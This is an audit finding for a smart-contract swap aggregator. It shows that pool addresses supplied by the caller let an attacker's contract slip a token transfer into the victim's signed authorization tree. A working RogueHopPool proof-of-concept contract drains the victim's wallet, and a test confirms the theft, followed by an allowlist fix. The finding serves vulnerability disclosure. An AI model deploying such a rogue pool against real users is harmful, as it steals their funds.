### Title
Attacker-supplied pool contract inside a swap route can drain arbitrary tokens from the caller's wallet via injected auth-tree child - ([File: contracts/swap-aggregator/src/venues/mod.rs](contracts/swap-aggregator/src/venues/mod.rs))

### Summary
Like IPSeed's `spawn` accepting an arbitrary `IIPSeedCurve` implementation, the XOXNO router executes hops against **arbitrary pool and token addresses taken verbatim from the caller-supplied `swap_xdr` payload**, with no allowlist of venues, pools, or tokens. Any contract reached through a route hop runs under the original caller's authorization context, so a malicious "pool" can call `token.transfer(victim, attacker, x)` on any token the victim holds, and that transfer is recorded as a child of the victim's `require_auth` entry — executing once the victim signs the simulated auth tree. Neither the router's measured-delta checks nor the controller's `RouterOverspend`/`NoSwapOutput`/final-risk gates bound this loss, because the stolen tokens are not routed funds.

### Finding Description
`execute_strategy` decodes `StrategyPayload` whose `assets` registry and instruction records freely name pool and token contract addresses; `dispatch_hop` invokes whatever `hop.pool` the payload specifies, measuring only the router's own balance deltas of the named input/output tokens [1](#0-0) . There is no venue/pool allowlist — the router's token whitelist selects only fee placement [2](#0-1) . The threat model itself confirms: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization… The loss is then the caller's wallet, not the routed amount" [3](#0-2) . The controller grants only one exact input transfer and checks controller-side balances [4](#0-3) , which does not protect the end user for whom the controller is the `sender` — the injected `transfer` is recorded under the end user's own auth entry on `swap_collateral`/`swap_debt`/`repay_debt_with_collateral`/`multiply`/`flash_position`, exactly as in the standalone `execute_strategy` path.

### Impact Explanation
Theft of user funds: an attacker-deployed pool named in a route can transfer the entire balance of any token (including tokens the protocol never listed) out of the victim's wallet to the attacker. The included test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` demonstrates `RogueHopPool::swap` transferring Alice's whole `WALLET_BALANCE` to the attacker while the swap itself still pays a fair output and all risk gates pass [5](#0-4) [6](#0-5) .

### Likelihood Explanation
An unprivileged attacker can deploy a conforming pool contract and embed it in a `StrategyPayload`; any caller who submits that payload (e.g., via a malicious route source or doctored `routeXdr`) signs an auth tree whose recorded simulation includes the theft transfer as a legitimate-looking child. No privileged access, parameter misconfiguration, or oracle dishonesty is required — the missing allowlist is the sole enabler. Exploitation depends on delivering the malicious payload to a signer, which lowers likelihood relative to a fully self-serve path; rated Medium-High.

### Recommendation
Mirror the report's "whitelist the curve implementation" fix: maintain an on-chain allowlist of approved pool (and possibly token) addresses per venue, enforced in `dispatch_hop` before invoking the hop. Until then, clients must decode the route and reject any authorization tree containing children other than the single expected `token_in.transfer` — but contract-level enforcement removes the trust assumption entirely.

### Proof of Concept
1. Attacker deploys `RogueHopPool` storing `(victim, wallet_token, attacker, amount)`.
2. Attacker constructs a route payload whose hop `pool` = `RogueHopPool`, with fair `token_in`/`token_out`/`min_out` so all measured checks pass, and gets the victim to submit it via `swap_collateral` (or direct `execute_strategy`).
3. During the hop, the router invokes `RogueHopPool::swap`, which calls `wallet_token.transfer(victim, attacker, amount)`; the host records it as a child of the victim's auth entry and it executes under her signature.
4. Result: swap succeeds (`received > 0`, `spent == amount_in`, account risk passes), but the victim's unrelated wallet balance is fully stolen. Demonstrated by `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs::simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry`.

pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received

#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
